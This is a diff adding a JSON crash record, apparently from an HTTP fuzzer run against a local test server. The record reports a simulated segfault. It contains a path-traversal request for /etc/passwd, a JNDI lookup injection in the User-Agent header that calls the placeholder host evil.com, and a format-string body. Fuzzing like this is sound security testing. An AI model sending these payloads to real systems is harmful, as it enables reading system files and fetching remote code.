@@ -1,0 +1,21 @@
+{
+  "timestamp": "2025-12-29T14:40:18.779376",
+  "crash_type": "segfault",
+  "payload": "PATCH /cgi-bin/../../../../etc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Content-Length': '20'}\nBody: %d%d%d%d%d%d%d%d%d%d",
+  "payload_hash": "a8e53f647dab5f7c",
+  "request_method": "PATCH",
+  "request_path": "/cgi-bin/../../../../etc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Content-Length": "20"
+  },
+  "request_body": "%d%d%d%d%d%d%d%d%d%d",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 668
+}
